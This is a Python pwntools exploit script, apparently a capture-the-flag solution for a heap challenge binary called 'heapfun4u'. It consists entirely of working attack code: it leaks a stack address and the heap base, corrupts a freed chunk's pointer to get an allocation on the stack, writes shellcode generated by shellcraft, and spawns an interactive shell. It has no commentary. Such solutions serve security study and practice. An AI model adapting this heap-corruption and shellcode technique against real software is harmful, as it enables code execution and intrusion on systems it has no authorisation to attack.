#!/usr/bin/env python
from pwn import *

def allocate(sz):
    s.sendafter('| ', 'A')
    s.sendlineafter('Size: ', str(sz))

def free(index):
    s.sendafter('| ', 'F')
    s.sendlineafter('Index: ', str(index))

def write(index, content, num=0):
    s.sendafter('| ', 'W')
    ret = {}
    for _ in range(num):
        i = int(s.recvuntil(') ')[:-2])
        ret[i] = int(s.recvuntil(' ')[:-1], 16)
        s.recvline()
    s.sendlineafter('where: ', str(index))
    s.sendafter('what: ', content)
    return ret

def nice():
    s.sendafter('| ', 'N')
    s.recvuntil('go: ')
    return int(s.recvline(False), 16)

def leave():
    s.sendafter('| ', 'E')

if __name__ == '__main__':
    context.arch = 'x86_64'
    elf = ELF('./heapfun4u')

    s = process(['./heapfun4u'])
    list_addr = 0x6020a0

    stack_addr = nice() + 0x104
    log.info('stack address: %#x' % stack_addr)

    allocate(0x100)
    heap_base = write(1, 'A', 1)[1] - 0x8
    log.info('heap base: %#x' % heap_base)

    free(1)
    allocate(0x10)
    allocate(0x10)
    allocate(0x100)
    free(1)
    write(1, p64(stack_addr))

    allocate(0x10)
    s.sendafter('| ', 'A' * 0xf0 + p64(0x128))
    s.sendafter('Size: ', str(0x128))

    write(6, 'A' * 0x30 + p64(heap_base + 0x38))

    write(4, asm(shellcraft.sh()))
    leave()
    s.recvuntil('Leave\n')

    s.interactive()
